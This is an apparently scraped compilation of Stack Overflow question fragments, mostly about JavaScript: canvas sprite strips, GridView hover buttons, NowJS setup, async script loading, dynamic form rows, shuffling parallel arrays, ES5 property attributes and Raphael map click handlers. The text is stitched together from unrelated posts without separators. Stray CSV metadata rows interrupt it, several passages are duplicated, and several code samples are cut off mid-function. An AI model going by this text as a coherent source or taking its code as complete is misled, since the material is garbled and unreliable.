Canvas doesn't support animated GIFs, so I can't do that, so instead I made a film strip for my animated sprites to give the illusion that a character is moving. Like this: http://i.imgur.com/wDX5R.png

Here's the relevant code:

    function player() {
    	
    	this.idleSprite = new Image();
    	this.idleSprite.src = ""/game/images/idleSprite.png"";
    	this.idleSprite.frameWidth = 28;
    	this.idleSprite.frameHeight = 40;
    	this.idleSprite.frameCount = 12;
    	
    	this.runningSprite = new Image();
    	this.runningSprite.src = ""/game/images/runningSprite.png"";
    	this.runningSprite.frameWidth = 34;
    	
    	this.update = function() {
    		
    	}
    	
    	var frameCount = 1;
    	this.draw = function() {
    		c.drawImage(this.idleSprite, this.idleSprite.frameWidth * frameCount, 0, this.idleSprite.frameWidth, this.idleSprite.frameHeight, 0, 0, this.idleSprite.frameWidth, this.idleSprite.frameHeight);
    		if(frameCount < this.idleSprite.frameCount - 1) { frameCount++; } else { frameCount = 0; }
    	}
    }
    
    var player = new player();

As you can see, I'm defining the idle sprite and also its frame width and frame count. Then in my draw method, I'm using those properties to tell the drawImage method what frame to draw. Everything works fine, but I'm unhappy with the `frameCount` variable defined before the draw method. It seems... hacky and ugly. Would there be a way that people know of to achieve the same effect without keeping track of the frames outside the draw method? Or even a better alternative to drawing animated sprites to canvas would be good.

I would then like to swap out the images of the buttons when a user first hovers over the GridView row and then again when the user hovers over a specific button.

I can easily accomplish this hover functionality using CSS and image hyperlinks, however when using image hyperlinks, I am unable to raise any server-side events to handle editing the particular row.

In the past, I've used ImageButtons instead of image hyperlinks. I added the CommandName parameter to the ImageButtons and then handled the GridView RowCommand in code:

    <asp:ImageButton ID=""btnSelect"" CommandName=""select"" runat=""server"" ImageUrl=""~/images/iconSelect.png"" />

In order to change the ImageButton image on hover, I used Javascript:

    <asp:ImageButton ID=""btnSelect"" onmouseover=""this.src='../images/iconSelectOver.png';"" onmouseout=""this.src='../images/iconSelect.png';"" runat=""server"" ImageUrl=""~/images/iconSelect.png"" />

However, in this case, I need to also replace the ImageButton image when a user first hovers over the GridView row itself.  

To sum up, when a user hovers over a GridView row, the ImageButtons on that row will all swap image1 for image2.  Then when a user hovers over a specific ImageButton, its image will switch from image2 to image 3.  

Thanks in advance for any suggestions you may have as to the best approach.

and for the server:

   

     var fs = require('fs');
    var sys = require('sys');
    var server = require('http').createServer(function(req,response){
    	fs.readFile('index.html',function(err,data){
    		response.writeHead(200);	
    		response.write(data);
    		response.end();
    	});
    	
    });
    server.listen(8080);
    sys.print('woot');
    
    var everyone = require('now').initialize(server);
    
    everyone.now.distributeMessage = function(name, message){
    	sys.print(name+""   ""+message);
    	everyone.now.receiveMessage(name,message);
    		
    };



I highly suspect it has something to do with my <script> tag since there isnt anything at /NowJS/now.js.
Can someone enlighten me on this part:

>On pages that you would like to use NowJS on, simply include this script tag in your HTML head:<script src=""/nowjs/now.js""></script> NowJS only works on pages that are served through the same http server instance that was passed into the initialize function above. 

Thanks for your time.",2

I have found several tutorials that enable me to import a JavaScript library asynchronously. for example I can do something like:

      (function () {
            var s = document.createElement('script');
            s.type = 'text/javascript';
            s.async = true;
            s.src = 'js/jquery-ui-1.8.16.custom.min.js';
            var x = document.getElementsByTagName('script')[0];
            x.parentNode.insertBefore(s, x);
        })();

for some reason when I do the same thing for all my files the pages does not work. I have been trying for so long to try to find where the problem is but I just cannot find it. First I thought that it was probably because some javascript functions depended on the others. but I loaded them in the right order using the time out function when one completed I proceeded with the next and the page still behaves weird. for example I am not able to click on links etc... animations still work though..

Anyways

Here is what I have been thinking... I believe browsers have a cache that's why it takes a long time to load the page for the first time and the next time it is quick. so what I am thinking of doing is replacing my index.html page with a page that loads all this files asynchronously. when ajax is done loading all those files redirect to the page that I plan on using. when using that page it should not take long to load since the files should alredy be included on the cache of the browser. on my index page (page where .js and .css file get loaded asynchronously) I don't care of getting errors. I will just be displaying a loader and redirecting the page when done... 

Is this idea a good alternative? or should I keep trying on implementing the asynchronously methods?

I mostly end up reading series of text on the internet that just talk about theories. I'm not disregarding the need to learn those theories as I realize I'll one day perhaps need to learn em to get a better grip on the subject, but for now, I just wanna start small, and build my way up to more complicated things.

1) So essentially what are Databases? People say it stores data (duh) but what sorts of data are we speaking of? Like, if I for example were to build Facebook for the first time, what sort of information would my databases store? User log-in info and such?

2) Speaking of databases, what are the ""best"" ones to use? I know it really is a matter of preference, but I'm mostly concerned with super speed, efficiency,  reliability, and simplicity of use. What is one you would personally recommend? 

3) Heroku is a rails-friendly server that allows you to deploy rails app without having to worry about server administration monkey work -- right?

4) What are the ""best"" ways to make sure your rails app is robust, blazing fast, and secured? Some devs been advising me about avoiding Javascript/JQ, because those two are (Generally) what slows down site loads. What do you think?

Super Thanks to everyone who shows me the light by answering my questions. I'll have more in the future I'm sure :)

I have a great interest in learning/getting a grip on Ruby and Rails, and so I figured this would be a great place to ask questions when I'm stumped.

While learning Ruby, I've been coming up with few questions which I need clarified. I've looked up these questions on Google but problem is I just need someone to explain the answers to me in a straightforward, laymen fashion (with everyday examples included). I mostly end up reading series of text on the internet that just talk about theories.

My goal is to find projects on GitHub (and learn to use Git like a pro) that involve any/all of the following technologies:

 - **Ruby** as the server-side language, preferably using the **Sinatra framework**. I like Sinatra's attempt to be very minimal because it'll allow me to focus on getting Rails up & going ASAP, and since I'll have to install various gems to get extended functionality, I'll learn all about gem management.
 - **JavaScript & jQuery** (and possibly **CoffeeScript**) - Everyone knows that JS is the language of the front end, and fast becoming a contender for back-end development too. I'm mainly interested in DOM additions/subtractions (i.e. live adding/removing elements to a list), basic animations & UI ""coolness"", and AJAX.
 - **MongoDB** - I've read a lot about it and the whole idea of its NoSQL methodology sounds fascinating.
 - **LESS** & go more in depth in CSS - Nuff said. I mainly use Twitter Bootstrap as my base, so I'll probably focus on just extending that.
 - **Templating Language** like **ERB** or **HAML** - People say they help you write HTML code faster & cleaner, which is what I'm all about
 - **External API calls** that return JSON documents - Being able to connect to external APIs (and eventually learning to write them) is something I want to become second nature.
 - **User login/authentication** - Most all apps have user accounts/admin areas/etc. It seems like a necessary skill to learn.

so basically the person chooses a set of hours and marks which days those apply to. of course there might be multiple sets of hours (ex. if a restaurant is open 12-2 one day but 12-5 another). i'd like to have a ""Add More Hours"" button that duplicates this same code when pressed, however many times is necessary.

what's the best way to go about this? how do you dynamically add a form element without needing to have it hidden at the beginning? how do i set different numbered names for each set of hours inputs, and later know how many to access (using PHP post)? i assume i'll need a javascript function that keeps track of how many have been added.

alternatively, i am open to suggestions on how to present hours inputs differently/better, perhaps a way that doesn't require dynamic creation of form elements. i do want to restrict the user's inputs so i don't have to worry about parsing weird entries, which is why i don't want to just have an text input box for each day.

11570276,07/19/2012 22:30:40,1534664,07/18/2012 11:46:29,6,0,Javascript: Sort a multidimensional array and a normal array the same way,"Alright, so the thing is; 

Now I made this website for myself to study japanese more easily, by making a list of japanese words and its definition. I put the japanese words in lesson1.txt and the answers in lesson1answers.txt in the same order. I read them out in php and put them in arrays in javascript. 

Now the problem is is that these arrays have the same order every time I start the site, which is quite annoying for me as I keep resembling the spot to the answer, and I dont even read the japanese word (Damn our human brains!). So I figured the best way to solve this is by randomizing the elements of both the arrays, but they both have to be randomized in the same pattern because else the question doesnt correspond correctly to the answer anymore.

One of the arrays I have is multidimensional. The array first holds elements that represent the lines I read out of a .txt file. The line has multiple characters in it, consequently the second element of the array represents each character (Dont ask me why I did this, it had to do with me not being able to read out japanese characters in php and put them in js directly).

",javascript,arrays,,,,,open,0,245,12,"Javascript: Sort a multidimensional array and a normal array the same way Alright, so the thing is; 

Now I made this website for myself to study japanese more easily, by making a list of japanese words and its definition. I put the japanese words in lesson1.txt and the answers in lesson1answers.txt in the same order. I read them out in php and put them in arrays in javascript. 

Now the problem is is that these arrays have the same order every time I start the site, which is quite annoying for me as I keep resembling the spot to the answer, and I dont even read the japanese word (Damn our human brains!). So I figured the best way to solve this is by randomizing the elements of both the arrays, but they both have to be randomized in the same pattern because else the question doesnt correspond correctly to the answer anymore.

One of the arrays I have is multidimensional. The array first holds elements that represent the lines I read out of a .txt file. The line has multiple characters in it, consequently the second element of the array represents each character (Dont ask me why I did this, it had to do with me not being able to read out japanese characters in php and put them in js directly). The other array is just the array I keep the answers in.

- Click on `A` returns to the previous site (= a back button)
- Click on `B` and `C` apply filter and submit the form (= retrieving the result set of the search)

- If not, then the user has not clicked a GUI element and the help message is being displayed

This could be made more easy by attaching a common CSS class (`gui-element`) to all GUI elements so the document onclick event handler checks only if the event target has this common class.

The drawback is that if any new element e. g. `D` is introduced in the HTML it must have this CSS class, too.

First, I have the form itself:

    <form name=""WEB070EDIT"" action=""WEB070"" method=""POST"">

Then lower, there's the table that will contain the generated cells:

    <table id='Form2Section2' width=""100%"" border=0 cellspacing=0 cellpadding=2>
    <tr class=""woborder"">
    <th >5. Material or Process Name</th>

    <th >8. Special Process Supplier Code</th>
    <th >9. Customer Approval Verification</th>
    <th >10. Certificate of Conformance Number</th>
    </tr>
    </table>

A bit above, there is my heinous script function that populates the table:

    <script type=""text/javascript"">
    function addForm1(itemId)
    {
     if (typeof addForm1.counter == 'undefined') {
     addForm1.counter = 1;

     curRow.className = ""woborder"";
     curRow.style.backgroundColor = ""#D0D0D0"";
     var curCell = curRow.insertCell(-1);
    
     var cellElem = document.createElement(""text"");
     cellElem.size = 25
     cellElem.value = """"
     cellElem.name = ""V_P2_MATERIAL_"" + addForm1.counter;
     cellElem.id = ""V_P2_MATERIAL_""+ addForm1.counter;
    
     var newAttr = document.createAttribute(""onKeyUp"");
     newAttr.nodeValue = ""...[some lengthy script stuff trimmed for readability]..."";
     cellElem.setAttributeNode(newAttr);
    
     curCell.appendChild(cellElem);
    
     curCell.appendChild(document.createElement(""br""));
    
     cellElem = document.createElement(""hidden"");
     cellElem.name = ""P2_MATERIAL_"" + addForm1.counter;
     cellElem.id = ""P2_MATERIAL_"" + addForm1.counter;
     cellElem.value = """";
    
     curCell.appendChild(cellElem);
    
     cellElem = document.createElement(""select"");
     cellElem.name = ""MYSELECT_P2_MATERIAL_"" + addForm1.counter;
     cellElem.id = ""MYSELECT_P2_MATERIAL_"" + addForm1.counter;
     cellElem.size = 10;
    
     newAttr = document.createAttribute(""onClick"");
     newAttr.nodeValue = ""...[more script stuff here we don't care about]..."";

     eval(""document.getElementById('V_P2_MATERIAL_"" + addForm1.counter + ""').focus();"");
     eval(""combohandleKeyUp('WEB070EDIT','MYSELECT_P2_MATERIAL_"" + addForm1.counter + ""','V_P2_MATERIAL_"" + addForm1.counter + ""','P2_MATERIAL_"" + addForm1.counter + ""',MYLIST_P2_MATERIAL,MYDESCLIST_P2_MATERIAL,9999999);"");
    
    }
    
    </script>

The reason we don't care about the onClick and onKeyUp is because we never get to that point.  What's supposed to happen is that the eval() is supposed to run some javascript that populates the combo boxes with some predefined variables.  It works perfectly, as long as the inputs are static.  However, when I hit the button that runs this script, it pukes on that combohandleKeyUp right near the beginning, where it is supposed to find the following object:

    document.forms['WEB070EDIT'].elements[""P2_MATERIAL_1""]

Obviously this is all variables inside the script itself, but that's what it parses out to according to the debugger.

When I use Firebug's DOM inspector, I can find the forms, I can find WEB070EDIT, but I can't find the hidden input P2_MATERIAL_1.

    <form name=""WEB070EDIT"" action=""WEB070"" method=""POST"">

Then lower, there's the table that will contain the generated cells:

    <table id='Form2Section2' width=""100%"" border=0 cellspacing=0 cellpadding=2>
    <tr class=""woborder"">
    <th >5. Material or Process Name</th>
    <th >6. Specification Number</th>
    <th >7. Code</th>
    <th >8. Special Process Supplier Code</th>
    <th >9. Customer Approval Verification</th>
    <th >10. Certificate of Conformance Number</th>
    </tr>
    </table>

A bit above, there is my heinous script function that populates the table:

    <script type=""text/javascript"">
    function addForm1(itemId)
    {
     if (typeof addForm1.counter == 'undefined') {
     addForm1.counter = 1;
     }
     var object = document.getElementById(itemId);
     var curRow = object.insertRow(-1);
     curRow.className = ""woborder"";
     curRow.style.backgroundColor = ""#D0D0D0"";
     var curCell = curRow.insertCell(-1);
    
     var cellElem = document.createElement(""text"");
     cellElem.size = 25
     cellElem.value = """"
     cellElem.name = ""V_P2_MATERIAL_"" + addForm1.counter;
     cellElem.id = ""V_P2_MATERIAL_""+ addForm1.counter;
    
     var newAttr = document.createAttribute(""onKeyUp"");
     newAttr.nodeValue = ""...[some lengthy script stuff trimmed for readability]..."";
     cellElem.setAttributeNode(newAttr);
    
     curCell.appendChild(cellElem);
    
     curCell.appendChild(document.createElement(""br""));
    
     cellElem = document.createElement(""hidden"");
     cellElem.name = ""P2_MATERIAL_"" + addForm1.counter;
     cellElem.id = ""P2_MATERIAL_"" + addForm1.counter;
     cellElem.value = """";
    
     curCell.appendChild(cellElem);
    
     cellElem = document.createElement(""select"");
     cellElem.name = ""MYSELECT_P2_MATERIAL_"" + addForm1.counter;
     cellElem.id = ""MYSELECT_P2_MATERIAL_"" + addForm1.counter;
     cellElem.size = 10;
    
     newAttr = document.createAttribute(""onClick"");
     newAttr.nodeValue = ""...[more script stuff here we don't care about]..."";

     eval(""document.getElementById('V_P2_MATERIAL_"" + addForm1.counter + ""').focus();"");
     eval(""combohandleKeyUp('WEB070EDIT','MYSELECT_P2_MATERIAL_"" + addForm1.counter + ""','V_P2_MATERIAL_"" + addForm1.counter + ""','P2_MATERIAL_"" + addForm1.counter + ""',MYLIST_P2_MATERIAL,MYDESCLIST_P2_MATERIAL,9999999);"");
    
    }
    
    </script>

The reason we don't care about the onClick and onKeyUp is because we never get to that point.  What's supposed to happen is that the eval() is supposed to run some javascript that populates the combo boxes with some predefined variables.  It works perfectly, as long as the inputs are static.  However, when I hit the button that runs this script, it pukes on that combohandleKeyUp right near the beginning, where it is supposed to find the following object:

    document.forms['WEB070EDIT'].elements[""P2_MATERIAL_1""]

Obviously this is all variables inside the script itself, but that's what it parses out to according to the debugger.

When I use Firebug's DOM inspector, I can find the forms, I can find WEB070EDIT, but I can't find the hidden input P2_MATERIAL_1.  The static stuff's all in there, but nothing that's getting dynamically generated.  Does this simply not work with dynamic objects?  Am I missing something?  Am I building it completely wrong?",3

My understanding so far (and hopefully you can clarify) is as follows:

Languages such as PHP, HTML, CSS are domain specific because they were designed for a singular purpose (e.g. they were designed for building websites - or in CSS' case was for styling websites). Whereas a language such as Ruby or Python is a general purpose language because it can be used for multiple purposes (e.g. Ruby can be used to build websites, as a command line tool, building Mac applications etc).

Would that be correct? And if so where does a language like JavaScript fit in which I believe was designed to be domain specific (e.g. it was designed to be used for adding interactivity to websites) but JavaScript can be run on the server or command line, it can be used to interact with software like Photoshop and even doing Windows Shell Scripting so could that be considered a general purpose language because it's used for multiple purposes OR is it still domain specific because it's origins were that it was designed for web?

    BEFORE | AFTER
      2.51 | 2.55
      2.50 | 2.50
      2.56 | 2.60

**Current Code**

    var _ceil = Math.ceil;
    Math.ceil = function(number, decimals){
        if (arguments.length == 1)
        return _ceil(number);

        multiplier = Math.pow(10, decimals);
        return _ceil(number * multiplier) / multiplier;
    }

Then elsewhere... 
`return (Math.ceil((amount - 0.05), 1) + 0.05).toFixed(2);`

Which is resulting in...

**rules are : The universe of the Game of Life is an infinite two-dimensional orthogonal grid of square cells, each of which is in one of two possible states, alive or dead. Every cell interacts with its eight neighbours, which are the cells that are horizontally, vertically, or diagonally adjacent. At each step in time, the following transitions occur: **1.Any live cell with fewer than two live neighbours dies, as if caused by under-population.

2.Any live cell with two or three live neighbours lives on to the next generation.

3.Any live cell with more than three live neighbours dies, as if by overcrowding.

4.Any dead cell with exactly three live neighbours becomes a live cell, as if by reproduction.**

The initial pattern constitutes the seed of the system. The first generation is created by applying the above rules simultaneously to every cell in the seed—births and deaths occur simultaneously, and the discrete moment at which this happens is sometimes called a tick (in other words, each generation is a pure function of the preceding one). The rules continue to be applied repeatedly to create further generations.**

I tried using an `UpdatePanel` around the iframe that starts an async postback, but I get a lot of javascript exception that crash the browser.

I have created a search feature for a site and in addition I made a ""suggestions box"" that drops down based on what they are typing. (Like Google does!)

So my issue is, the box floats out of position depending on the window size. How do I fix it to the bottom of the search field?

Live example found here: [http://swissinstruments.com/searchresults.php][1] (see top search field, type ""a"" or ""c"" to get some suggestions coming down.

Finally the Javascrip part that is used to position the div.  I have set the x to -164 since it seems to work for the resolution used by most users. But as soon as I shrink or stretch it the box is out of position.

    /********************************************************

		//Walk up the DOM and add up all of the offset positions.
		while (el.offsetParent && el.tagName.toUpperCase() != 'BODY')

			el = el.offsetParent;
		}

		this.div.style.left = x + 'px';

Is there any way to use percentages rather than px?  I can't thank you guys enough for the help.

### So nice for now, but, what do we got? ###

A lot of Open Source cross-platform JavaScript mobile frameworks are available over the web so the doubt is *which of them to use*.

These options are the nicer I've found (in order of relevance):

 - [jQuery Mobile][3]
 - [Sencha Touch 2][4]
 - [Kendo UI][5]
 - [DHTMLX Touch][6]
 - [Monocross][7]

In general, all these frameworks runs over HTML5 and have a great documentation and community.

**jQuery Mobile** is the mobile module of the well known - may the actually most popular -  JavaScript framework by the web developers. Because of this you can trust on a wide community documentation and support.

Another well known web developers fella is **Sencha Touch 2**. It's paid. I particularly worked with EXTJS 2 and 3 and its used(as described on their [page][8]) by some famous companies. They got *paid support*.

**Kendo UI** -as Sencha- does not have a free version. It have a complete version with **ASP.NET MVC** what is very interesting. One differential that I haven't notice on others frameworks is that *it have native UI for different devices*. The product packages includes support. I've listed above(considering the order of relevance) jQuery e Sencha cause I have no idea how big is it community and use.

**DHTMLX Touch** and **Monocross** are unknown to me. DHTMLX Touch got paid support, Monocross don't and also have a lack of information(like screenshots, examples or demos, ""who's using""...). Hard to form an opinion about it. But DHTML Touch have nice explanation of features and products.

Another minor projects, but also interesting frameworks are [XUI.js][9] and [Zepto.js][10].

[Here's a huge graph][11] about device compatibility of a ton of frameworks.

I never even realized/thought about someone using JavaScript to do some weird ass injection attacks.

It however left me with some unanswered questions.


First

When do you use html.encode? Like do you use it only when you are going to display information that that user or some other user had submitted?

Or do I use it for everything. Like say I have form that a user submits, this information will never be displayed to any of the users, should I be still using html.encode? 

How would I do it like I am not sure how to put inside say and Html.TextBox() the html.encode tag.


Second

What happens say I have on my site a rich html editor. The user is allowed to use it and make things bold and whatever. Now I want to display information back to the user through a label. I can't Html.Encode it since then all the bold and stuff will not be rendered.

Yet I can't leave it like it is since what would stop a user to add some Javascript attack?

So what would I do? Use Regex to filter out all <script> tags?


Third 

There is also another tag you can use called ""AntiforgeryToken"" when would you use this one?

Thanks

The problem is when I add the send button to the page, it generates the iframe code inside and even if I modify the href parameter later on, the iframe still keeps the original link in. I guess the solution would be to refresh the content of the send button somehow or add it after page load, once the fields have been completed, but I couldn't figure it out.

As you can see, it doesn't redirect to the designated URL in the javascript.  When I use the window.open then it works. Note that in the < form... > tag, I don't put the *action* property in it.  I don't want to open a new browser, just redirect to the new url within the same browser. 

Is there a way to redirect it?

My solution so far involved calling a function that checks for the backspace or delete keyCode on the onKeyDown event, but the problem is once it handles the extra stuff I want done associated with those key presses, it does not actually perform the key functionality of removing the characters in the text box. A code example is shown below. This gives the effect that the keys don't work to the user when they are making edits in the text box.

The first grid is completed with the exception of hiding the sorting menu but that is not the problem. The problem is the second grid. The combo box is there at the moment to let me know that it's working but I need that combo box only in the first row second column and the second row second column to have a different combo box (third one as well) and the fourth and fifth to be text fields. I can get the combo box to come up with only one store (total of three combo box stores) but I need the second and third combo boxes to show up in the second and third rows. Any help? (code is posted below) And I'm using ExtJS tabs as well.

10555489,05/11/2012 16:49:21,654445,03/10/2011 23:04:18,54,0,How can I add multiple functions to one file,"Im trying to create a mash Up of sorts... I want the functions to be in one file but when I add my Ajax functions (half way down ) nothing displays.

Also I want to display them with jQuery, and the top function(google maps with marker and info) all works a treat until I add the bottom functions.

Should I add them in the (function () {} ) like google has and what is the (); on the end of the googlemap function?

and when I call my functions in my code how will i call the ajax for the preview as the window.onload has been called in the google one.

I know that I can use the $.ready fuction(){} but do I just put the function names in the .ready function { <in here> }

I am un sure how to add all the functions in one file and make them work . basically

this is the code:

and when I call my functions in my code how will i call the ajax for the preview as the window.onload has been called in the google one.

I know that I can use the $.ready fuction(){} but do I just put the function names in the .ready function { <in here> }

I am un sure how to add all the functions in one file and make them work . basically

this is the code:

    (function() {
		
			//define global variables
			var map, geocoder, marker, infowindow;
			
			window.onload = function() {
			
				//creating the map
				var options = {
					zoom: 5,
					center: new google.maps.LatLng(53.383, -1.483),
					mapTypeId: google.maps.MapTypeId.ROADMAP
				};
				
				map = new google.maps.Map(document.getElementById('map'), options);
				
				//code for catching the form submit event goes here
				//Getting the reference to the HTML form
				var form = document.getElementById('addressForm');
				
				//Catching the forms submit event
				form.onsubmit = function () {
				
					//getting the address from the text input
					var address = document.getElementById('address').value;
					
					//Making the geocode call
					getAddress(address);
					
					//Preventing the form from doing a page submit
					return false;
					}
				}
				
				//Function Stub
				function getAddress(address) {
				
					//Check to see if we already have a geocode object.
					//If not we create one
					if(!geocoder) {
						geocoder = new google.maps.Geocoder();
					}
					
					//Creating the geoCoderRequest Object	
					var geocoderRequest = {
						address: address
					}
					
					//Making the geocode request
					geocoder.geocode(geocoderRequest, function (results, status) {
					
						//Check if status is ok beofre proceeding
						if (status == google.maps.GeocoderStatus.OK){
							
							//Center the map on the returned location
							map.setCenter(results[0].geometry.location);
							
							//Check to see if already a Marker there
							if (!marker){
								//Create a new marker and add it to the map
								marker = new google.maps.Marker({
									map: map	
									});
								}
							//Setting position of the Marker to returned location
							marker.setPosition(results[0].geometry.location);
							
								//Check to see if we've already an info window
								if(!infowindow) {
									//Creating a new info window
									infowindow = new google.maps.InfoWindow();
									}
								//Creating the content of the info window to the Address
								//and the returned position
								var content = '<strong>' + results[0].formatted_address + '</strong><br />';
								content += 'Lat: ' + results[0].geometry.location.lat() + '<br />';
								content += 'Lng: ' + results[0].geometry.location.lng();
								
								//Adding the content to the info window
								infowindow.setContent(content);
								
								//Opening the infoWindow
								infowindow.open(map, marker);
								
							}
					
					});
				}
				
				})();
		
		
		// beginning of new function
				var xhr = false;
				var xPos, yPos;
				
				function prev(){
						var link = document.getElementByTagName(""a"").onmouseover = showPreview;

I suggest to look at it before going on reading.  
  
Ok, now we're ready.  
As you saw there is a class inheritance chain: `LeafDevice` -> `EndDevice` -> `SubNetDevice` -> `NetDevice` -> `Device`.
When i instantiate a new `LeafDevice` the chain is fulfilled (ie it executes in the correct order) but only attributes from `LeafDevice` and `EndDevice` are set (look at the console).  
When i run the update method it seems to jump a class every 2... I mean, you see from the output that javascript doesn't seem to run the `EndDevice.update()` and `NetDevice.update()` methods... Only attributes from `Device`, `SubNetDevice` and `LeafDevice` are updated/added (again, look at the console)...  
This is driving me crazy as i cannot figure out what i'm doing wrong!!  
What i'm trying to do is to instantiate a `LeafDevice` object that follows the inheritance chain i defined so that at the end it has all defined attributes (`myDeviceAttr`, `myNetDeviceAttr`, `mySubNetDeviceAttr`, `myEndDeviceAttr`, `myLeafDeviceAttr`).  
Can you give some ideas on what's going on here please?

I was doing some snooping on the web and found `window.location.hash = ""etc""` to be a widely adopted method to update the browser's location without reloading / refreshing the page. I've applied that to this example I've cooked up: http://dl.dropbox.com/u/1595444/locationExample/index.html

Works well in Safari, but...

What I've noticed is that in Chrome 10+ upon changing `hash`:

<li>There is something similar to a reload.</li>
<li>The resulting symptom is a hiccup as the user scrolls down or up.</li>
<li>My console output is preserved (if you check your console the project string's are outputted).</li>

7748317,10/13/2011 01:02:38,142368,07/21/2009 21:45:36,298,21,Generate JSON to Convert into ECMAScript 5 Ready Consumption,"[In my client/server web app][1], I am generating large JSON strings (using JSON.NET JToken classes in C# web services) which I pass via AJAX Get requests to the client.

I would like to be able to define certain properties in the ES5 style: `prop: { value: '1', enumerable: false, writable: true }`, but there's a hitch. 

First, JSON.parse() simply interprets the 'enumerable' and 'writable' properties as generic properties on a generic JavaScript object. This is probably expected and desirable behavior, but is the a comparable method to 'parse' the JSON with respect to new ES5 property attributes?

Second, Object.create() works, but it has some limitations. For example, 

    //Native works
    var prop = Object.create(Object.prototype, { prop: { value: '1', enumerable: false, writable: true } });
    //prop === ""1""

    //Parse works
    var prop = Object.create(Object.prototype, JSON.parse({ ""prop"": { ""value"": '1', ""enumerable"": false, ""writable"": true } });
    //prop === ""1""    

    //Parse fails
    var prop = Object.create(Object.prototype, JSON.parse({ ""prop"": { ""value"": '1', ""enumerable"": ""false"", ""writable"": ""true"" } });
    // prop === JSON.parse({ ""prop"": { ""value"": '1', ""enumerable"": ""false"", ""writable"": ""true"" } })

The problem here, of course, is that `""true"" !== true`, which instructs `Object.create()` to return the same object as `JSON.parse()`. Further, either because of the truthy evaluation of a particular prop attribute OR because I'm attempting to create particularly large objects, `Object.create()` seems to be quite fragile.

Is there a better way to ""parse"" these objects in a way that respects the ES5 prop attributes?

I know that the microphone can be recorded from using Flash or Silverlight, but these don't allow control of the microphone volume.  (Flash has [Microphone.gain][1], but as its just a software multiplier, it doesn't help when the system mic volume is muted or too loud.)

I've heard that HTML5 will have some sort of microphone access, but whether it will allow volume control is unclear to me.  At any rate, I don't think any browsers support it yet.

Are there any plugins that would allow volume control?  The old Google Gears project has some [AudioApi][2] docs, though these don't seem to have made it into the actual plugin.

I know that the microphone can be recorded from using Flash or Silverlight, but these don't allow control of the microphone volume.  (Flash has [Microphone.gain][1], but as its just a software multiplier, it doesn't help when the system mic volume is muted or too loud.)

I've heard that HTML5 will have some sort of microphone access, but whether it will allow volume control is unclear to me.  At any rate, I don't think any browsers support it yet.

Are there any plugins that would allow volume control?  The old Google Gears project has some [AudioApi][2] docs, though these don't seem to have made it into the actual plugin.  There's also the [Google Talk plugin][3]- it seems to do some kind of gain control, but its unclear if there's an api to the plugin.

        -webkit-box-sizing:border-box;

If I then run the following javascript/jquery code, my textarea's height gets cut in half using Safari(5.0.6) and Chrome(16.0.x):

        var $this = $(this);

According to the jQuery docs for .height(), this is the expected behavior because .height() returns the content height (no padding, border), regardless of the box-sizing property, but .height( value ) sets the content size *accounting for* the box-sizing property. So if my textarea has content-height:17px and padding-height:15px, .height() will return 17px. Then, if I set .height(17) my textarea that used to be 32px high is now only 17px high.

My real-world application is using jQuery.fn.autoResize 1.14 ([https://github.com/padolsey/jQuery.fn.autoResize][1]) on textareas that have box-sizing applied. That code pulls a similar stunt to what I've described above.

It works fine in FireFox 10. (That is, FireFox accounts for box-sizing in a more symmetrical way when getting and setting height.)

I originally had the server set the time left, and just did a `setTimeout` for 1 second that would decrement the time.

I found 2 problems with this:

 1. There is a lag from the server setting the time until the client's page is rendered and the JavaScript begins to run. The lag amount depends on the speed of the users internet connection and computer/JavaScript engine.
 2. I think `setTimeout` of 1 second may have been getting behind a little on slower computers.

I changed it so the server would set the ending time and the JavaScript on the client would take the time (in UTC) and calculate the remaining time left. It would then do this on every `setTimeout` callback. This makes the time and countdown perfect. If the client has a fast computer/JavaScript engine, the timer stays on page. If the computer/JavaScript engine is slower, you may see a second be skipped here and there, but the time is never off.

I found 1 problem with this method so far:

 1. Every client's clock may be different.

I am developing a site for a touch interface that uses unordered lists and jquery .click functions to take input data. I have a section to input a m:ss time, with 3 divs, each containing a list of digits for time. I need to get the input for each column and set it as a variable. I originally designed the inputs to change form inputs, because I didn't understand javascript very much. It was easy to change the 3 hidden inputs by using div id's, but I can't figure out how to do it now with javascript variables.

Here is my original jquery code...

    $(""div#time>div>ul>li"").click(function() {
		var id = $(this).parents("".time"").attr(""name"");
		var number = $(this).html();
		$(""input#""+id).val(number);   });

The last line sets one of 3 hidden inputs equal to whatever was clicked. I need to make it so separate variables take the inputs, then I can manipulate those variables however I want.

Here's a short snippet of the html, to have an idea of how jquery grabs it.

http://up.massrelevance.com/cnbc/top-states/heatmap.html

It's rendered with the help of Raphael and a couple of prepackaged libraries to generate the paths for the states. At some point in my code, I generate an array of references to the Raphael object representing each state; then I iterate over them, attaching a click handler to each (the actual Raphael object is stored in `projection.map`) using Raphael's `.click()` method:

    Heatmap.prototype.stateClick = function() {
      var projection, 
          state, 
          _this = this;
      for (state in this.projections) {
        projection = this.projections[state];

This works fine for 48 of the 50 states. However, for some reason, Alaska (AK) and Oklahoma (OK) don't seem to get the click handler - that is, when I click them, nothing happens.

Watching the console for the output of the `console.log` calls in the code above, I can't see any differences between the Raphael objects for AK & OK from any other state's object, so I'm baffled as to what the cause may be.

Can anyone determine or guess what's happening, or maybe suggest how I might debug this further? Is there anything about how these shapes are drawn (e.g., maybe not with fully closed paths?) that may cause the click handler to fail to attach?

I've got a jquery script that uses a very small flash swf file to establish a true socket connection. As a server I'd like to use python.

I guess since they both have the same problem the problem's not here.

                    data = client_socket.recv(512)
                    print ""RECIEVED:"" , data

Or this one:

    import socket
    mySocket = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )

       print 'We have opened a connection with', details
       print channel.recv ( 100 )
       channel.close()

On the client side I use http://devpro.it/xmlsocket/<br>
Sending a piece of data is as simple as executing

    xmls.send('some text');

Hi
Usually, to compare two strings using == but does not work.
The if statement is the condition (p == l) but not running its internal code

You have my code.
In starting, charging from the file config_json.cfg (JSON) names for the list.
Now write a string in the text area that belongs to a list.
Pressing the button: pulisce ca cacosa , the program scans the list.
As you see in the code of button if there is a display containing the window alert.

Sorry if there are too many alerts, but serve to analyze the program.

If it works. let me know how!!
Hi
Usually, to compare two strings using == but does not work.
The if statement is the condition (p == l) but not running its internal code

You have my code.
In starting, charging from the file config_json.cfg (JSON) names for the list.
Now write a string in the text area that belongs to a list.
Pressing the button: pulisce ca cacosa , the program scans the list.
As you see in the code of button if there is a display containing the window alert.

Sorry if there are too many alerts, but serve to analyze the program.

From there the the PHP generated xhtml is sent back to javascript as response text.  This xhtml contains embedded javascript used to display ""pretty time"".  

